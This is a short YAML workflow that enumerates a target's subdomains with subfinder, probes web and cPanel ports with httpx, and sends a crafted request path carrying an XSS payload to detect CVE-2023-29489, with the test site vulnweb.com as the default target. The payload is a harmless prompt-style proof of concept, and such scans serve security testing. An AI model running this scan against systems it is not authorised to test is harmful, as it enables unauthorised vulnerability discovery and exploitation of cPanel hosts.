description: This YAML discovers all subdomains of a specified target, checks their availability on common web and cPanel ports, and probes for CVE-2023-29489 XSS vulnerability using a crafted path, focusing on responses with a 400 status code.
params: target=vulnweb.com
env:
  - HOME: /root/
  - LOG_DIR: ${HOME}/logs
  - PATH: /usr/local/bin:${PATH}
steps:
  - name: cve
    command: bash
    script: |
      subfinder -d ${target//\"} -silent -all | httpx -silent -ports http:80,https:443,2082,2083 -path 'cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">aaaaaaaaaa' -mc 400
